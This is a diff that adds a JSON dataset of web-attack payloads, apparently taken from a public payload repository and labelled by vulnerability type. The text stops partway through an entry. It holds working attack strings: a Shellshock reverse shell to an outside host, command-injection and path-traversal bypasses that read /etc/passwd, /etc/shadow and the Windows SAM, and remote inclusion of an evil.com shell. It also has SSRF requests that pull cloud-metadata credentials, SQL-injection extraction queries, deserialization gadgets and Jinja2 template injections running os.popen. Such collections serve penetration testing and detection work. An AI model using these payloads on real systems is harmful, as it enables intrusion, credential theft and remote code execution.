@@ -1,0 +1,1550 @@
+[
+ {
+  "vuln_type": "general",
+  "payload": "curl --silent -k -H \"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1\" \"https://10.0.0.1/cgi-bin/admin.cgi\"",
+  "context": "CVE-2014-6271 - Shellshock",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some we",
+  "source": "payloads/cve exploits/readme.md"
+ },
+ {
+  "vuln_type": "cmdi",
+  "payload": "swissky@crashlab:~$ echo ${HOME:0:1}",
+  "context": "Bypass Characters Filter",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Commands execution without backslash and slash - linux bash",
+  "source": "payloads/command injection/readme.md"
+ },
+ {
+  "vuln_type": "cmdi",
+  "payload": "swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd",
+  "context": "Bypass Characters Filter",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Commands execution without backslash and slash - linux bash",
+  "source": "payloads/command injection/readme.md"
+ },
+ {
+  "vuln_type": "cmdi",
+  "payload": "cat ${test//hhh\\/hm/}",
+  "context": "Bypass With Variable Expansion",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/command injection/readme.md"
+ },
+ {
+  "vuln_type": "cmdi",
+  "payload": "cat ${test//hh??hm/}",
+  "context": "Bypass With Variable Expansion",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/command injection/readme.md"
+ },
+ {
+  "vuln_type": "cmdi",
+  "payload": "g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/}",
+  "context": "Challenge",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Challenge based on the previous tricks, what does the following command do:",
+  "source": "payloads/command injection/readme.md"
+ },
+ {
+  "vuln_type": "traversal",
+  "payload": "../",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.",
+  "source": "payloads/directory traversal/readme.md"
+ },
+ {
+  "vuln_type": "traversal",
+  "payload": "..\\",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.",
+  "source": "payloads/directory traversal/readme.md"
+ },
+ {
+  "vuln_type": "traversal",
+  "payload": "..\\/",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.",
+  "source": "payloads/directory traversal/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1",
+  "context": "LFI to RCE via /proc/self/environ",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file",
+  "source": "payloads/file inclusion/lfi-to-rce.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam",
+  "context": "Windows version",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Extract `sam` and `system` files.",
+  "source": "payloads/file inclusion/lfi-to-rce.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../../../../WINDOWS/repair/system",
+  "context": "Windows version",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Extract `sam` and `system` files.",
+  "source": "payloads/file inclusion/lfi-to-rce.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../../../../etc/shadow",
+  "context": "Linux version",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Extract `/etc/shadow` files.",
+  "source": "payloads/file inclusion/lfi-to-rce.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../etc/passwd%00",
+  "context": "Null Byte",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": ":warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00",
+  "context": "Double Encoding",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
+  "context": "UTF-8 Encoding",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]",
+  "context": "Path Truncation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]",
+  "context": "Path Truncation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]",
+  "context": "Path Truncation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd",
+  "context": "Path Truncation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=....//....//etc/passwd",
+  "context": "Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=..///////..////..//////etc/passwd",
+  "context": "Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
+  "context": "Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "http://example.com/index.php?page=http://evil.com/shell.txt%00",
+  "context": "Null Byte",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/file inclusion/readme.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page",
+  "context": "Wrapper php://filter",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`\n- deflate then `base64encode` (useful for limited character exfil): `php://filt",
+  "source": "payloads/file inclusion/wrappers.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php",
+  "context": "Wrapper php://filter",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`\n- deflate then `base64encode` (useful for limited character exfil): `php://filt",
+  "source": "payloads/file inclusion/wrappers.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"https://example.com/index.php?page=php://input%00\" -k -v",
+  "context": "Wrapper input://",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Specify your payload in the POST parameters, this can be done with a simple `curl` command.",
+  "source": "payloads/file inclusion/wrappers.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "./kadimus -u \"https://example.com/index.php?page=php://input%00\"  -C '<?php echo shell_exec(\"id\"); ?>' -T input",
+  "context": "Wrapper input://",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Alternatively, Kadimus has a module to automate this attack.",
+  "source": "payloads/file inclusion/wrappers.md"
+ },
+ {
+  "vuln_type": "lfi",
+  "payload": "Finally call the phar wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`",
+  "context": "PHAR deserialization",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "// add object of any class as meta data\nclass AnyClass {\n    public $data = null;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n    \n    function __destruct() {\n        s",
+  "source": "payloads/file inclusion/wrappers.md"
+ },
+ {
+  "vuln_type": "deserialization",
+  "payload": "for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done",
+  "context": "Marshal Deserialization",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5",
+  "source": "payloads/insecure deserialization/ruby.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/insecure source code management/subversion.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>",
+  "context": "Executing XSS via redirect_uri",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/oauth misconfiguration/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "Example of a vulnerable configuration: An attacker requesting `/styles../secret.txt` resolves to `/path/styles/../secret.txt`",
+  "context": "Off By Slash",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nserver {\n  location /app/ {\n    # Handles /app/ and anything below, e.g., /app/foo\n  }\n  location /app {\n    # Handles only /app with nothing after OR routes like /application, /appzzz\n  }\n}",
+  "source": "payloads/reverse proxy misconfigurations/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "In this curl request, the attacker supplied as `Referer` header a Go template expression: `{{readFile \"etc/passwd\"}}`.",
+  "context": "Template Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\n:80 {\n    root * /\n    templates\n    respond \"You came from {http.request.header.Referer}\"\n}",
+  "source": "payloads/reverse proxy misconfigurations/readme.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
+  "context": "PostgreSQL Error Based",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\nCAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column",
+  "source": "payloads/sql injection/postgresql injection.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+  "context": "PostgreSQL Error Based",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\nCAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column",
+  "source": "payloads/sql injection/postgresql injection.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+  "context": "PostgreSQL Error Based",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\nCAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column",
+  "source": "payloads/sql injection/postgresql injection.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+  "context": "PostgreSQL Error Based",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\nCAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column",
+  "source": "payloads/sql injection/postgresql injection.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'",
+  "context": "Columns Dump Time Based",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from ta",
+  "source": "payloads/sql injection/postgresql injection.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
+  "context": "Columns Dump Time Based",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from ta",
+  "source": "payloads/sql injection/postgresql injection.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.",
+  "context": "Raw MD5 and SHA1",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```php\nsql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";",
+  "source": "payloads/sql injection/readme.md"
+ },
+ {
+  "vuln_type": "sqli",
+  "payload": "`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.",
+  "context": "Routed Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```sql\n' union select 0x2720756e696f6e2073656c65637420312c3223#",
+  "source": "payloads/sql injection/readme.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "Example of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`",
+  "context": "DNS AXFR",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "# ARCOUNT\ndns_request += len(domain).to_bytes() # LEN DOMAIN\ndns_request += domain.encode()        # DOMAIN\ndns_request += len(tld).to_bytes()    # LEN TLD\ndns_request += tld.encode()           # TLD\n",
+  "source": "payloads/server side request forgery/ssrf-advanced-exploitation.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py",
+  "context": "WSGI",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Exploit using the Gopher protocol, full exploit script available at [wofeiwo/webcgi-exploits/uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py).",
+  "source": "payloads/server side request forgery/ssrf-advanced-exploitation.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`",
+  "context": "SSRF URL for AWS",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`\n* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"",
+  "context": "SSRF URL for AWS",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`\n* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl http://169.254.170.2/v2/credentials/<UUID>",
+  "context": "SSRF URL for AWS ECS",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next",
+  "context": "SSRF URL for AWS Lambda",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA",
+  "context": "Add an SSH key",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Check the scope of the token",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\"",
+  "context": "Add an SSH key",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Now push the SSH key.",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl http://169.254.169.254/metadata/v1/id",
+  "context": "SSRF URL for Digital Ocean",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Documentation available at `https://developers.digitalocean.com/documentation/metadata/`",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl http://169.254.169.254/metadata/v1.json | jq",
+  "context": "SSRF URL for Digital Ocean",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Documentation available at `https://developers.digitalocean.com/documentation/metadata/`",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl -L http://127.0.0.1:2379/version",
+  "context": "SSRF URL for Kubernetes ETCD",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Can contain API keys and internal ip and ports",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl http://127.0.0.1:2379/v2/keys/?recursive=true",
+  "context": "SSRF URL for Kubernetes ETCD",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Can contain API keys and internal ip and ports",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json",
+  "context": "SSRF URL for Docker",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json",
+  "context": "SSRF URL for Docker",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "ssrf",
+  "payload": "curl http://rancher-metadata/<version>/<path>",
+  "context": "SSRF URL for Rancher",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side request forgery/ssrf-cloud-instances.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{'a'.toUpperCase()}} would result in 'A'",
+  "context": "Jinjava - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/java.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206",
+  "context": "Jinjava - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/java.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ 7*7 }}  # Error with Django Templates",
+  "context": "Django - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r",
+  "context": "Django - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ '<script>alert(3)</script>' }}",
+  "context": "Django - Cross-Site Scripting",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ '<script>alert(3)</script>' | safe }}",
+  "context": "Django - Cross-Site Scripting",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ messages.storages.0.signer.key }}",
+  "context": "Django - Leaking App's Secret Key",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{4*4}}[[5*5]]",
+  "context": "Jinja2 - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{7*'7'}} would result in 7777777",
+  "context": "Jinja2 - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{config.items()}}",
+  "context": "Jinja2 - Basic Injection",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "<li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>",
+  "context": "Jinja2 - Template Format",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ [].class.base.subclasses() }}",
+  "context": "Jinja2 - Dump All Used Classes",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{''.class.mro()[1].subclasses()}}",
+  "context": "Jinja2 - Dump All Used Classes",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ ''.__class__.__mro__[2].__subclasses__() }}",
+  "context": "Jinja2 - Dump All Used Classes",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ self.__init__.__globals__.__builtins__ }}",
+  "context": "Jinja2 - Dump All Used Classes",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Access `__globals__` and `__builtins__`:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "<dt>{{ key|e }}</dt>",
+  "context": "Jinja2 - Dump All Config Variables",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "<dd>{{ value|e }}</dd>",
+  "context": "Jinja2 - Dump All Config Variables",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",
+  "context": "Jinja2 - Write Into Remote File",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabili",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabili",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabili",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ cycler.__init__.__globals__.__builtins__.getattr(\"\", \"x\" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Similar payloads could be used for Error-Based and Boolean-Based exploitation:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ 1 / (cycler.__init__.__globals__.os.popen(\"id\")._proc.wait() == 0) }} # Boolean-Based",
